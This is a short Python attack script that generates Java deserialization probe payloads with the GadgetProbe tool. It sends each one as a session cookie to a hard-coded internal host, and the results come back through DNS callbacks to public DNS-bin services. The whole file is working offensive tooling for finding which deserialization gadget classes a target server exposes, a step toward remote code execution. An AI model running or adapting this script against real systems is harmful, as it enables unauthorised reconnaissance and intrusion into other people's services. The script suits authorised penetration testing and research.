import subprocess, sys, requests

banner = """

Generate GadgetProbe payloads in base64 with free DNSbins
(https://interact.projectdiscovery.io/) or (https://requestbin.net/dns) or (https://dnsbin.zhack.ca)
Usage: python3 fuzz.py wordlist.txt XXXXXXXXXXXXXX.interact.sh

"""

if len(sys.argv) < 2:
	print(banner)
	sys.exit()

wordlist = sys.argv[1]

dnsbin = sys.argv[2]

get_payloads = subprocess.getoutput("java -cp '.:GadgetProbe-1.0-SNAPSHOT-all.jar' gen_payloads.java %s %s" % (wordlist,dnsbin))

payloads = [ x for x in get_payloads.split('\n') if x.startswith('rO0') ]


if not payloads:
	print("[!] Something went wrong while generating payloads!")
	sys.exit()


for payload in payloads:
	resp = requests.get("http://172.16.95.1:8000",timeout=30,headers={"Cookie": "JSESSID=%s" % payload}).text
	print(".",end="")
